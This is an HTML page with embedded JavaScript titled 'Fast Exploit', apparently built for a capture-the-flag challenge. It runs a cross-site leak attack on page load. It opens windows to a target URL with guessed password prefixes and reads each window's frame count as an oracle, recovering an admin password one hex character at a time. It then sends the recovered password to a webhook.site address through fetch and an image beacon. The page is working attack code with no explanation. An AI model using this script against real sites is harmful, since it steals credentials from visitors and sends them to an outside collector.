<!DOCTYPE html>
<html>
<head><title>Fast Exploit</title></head>
<body>
<h1>Leaking admin password (OPTIMIZED)...</h1>
<pre id="output"></pre>
<script>
const output = document.getElementById('output');
const TARGET = 'https://127.0.0.1:9999/';
const CHARSET = '0123456789abcdef';
let knownPassword = 'lebah';

function log(msg) {
    output.textContent += msg + '\n';
    console.log(msg);
}

// Test multiple substrings in parallel
async function testBatch(candidates) {
    const promises = candidates.map(cand => 
        new Promise((resolve) => {
            const win = window.open(TARGET + '?pass=' + encodeURIComponent(cand));
            setTimeout(() => {
                try {
                    const hasFrame = win.length > 0;
                    win.close();
                    resolve({ cand, hasFrame });
                } catch(e) {
                    win.close();
                    resolve({ cand, hasFrame: false });
                }
            }, 500);  // Very fast 500ms
        })
    );
    
    return await Promise.all(promises);
}

async function leakPassword() {
    log('[*] Fast parallel password leak starting...');
    log('[*] Known prefix: ' + knownPassword);
    log('[*] Testing 4 candidates at a time for speed\n');
    
    // Leak 12 hex chars
    for (let pos = 0; pos < 12; pos++) {
        log(`[*] Position ${pos+1}/12...`);
        
        // Test in batches of 4 for speed
        for (let i = 0; i < CHARSET.length; i += 4) {
            const batch = [];
            for (let j = 0; j < 4 && (i+j) < CHARSET.length; j++) {
                batch.push(knownPassword + CHARSET[i+j]);
            }
            
            log(`  Testing batch: ${batch.join(', ')}`);
            const results = await testBatch(batch);
            
            const match = results.find(r => r.hasFrame);
            if (match) {
                knownPassword = match.cand;
                const newChar = match.cand[match.cand.length - 1];
                log(`  [+] FOUND: '${newChar}' -> ${knownPassword}\n`);
                break;
            }
        }
    }
    
    log('\n========================================');
    log('LEAKED PASSWORD: ' + knownPassword);
    log('========================================');
    
    // Exfiltrate
    try {
        fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?password=' + encodeURIComponent(knownPassword));
        new Image().src = 'https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?pass=' + encodeURIComponent(knownPassword);
    } catch(e) {}
}

setTimeout(leakPassword, 500);
</script>
</body>
</html>
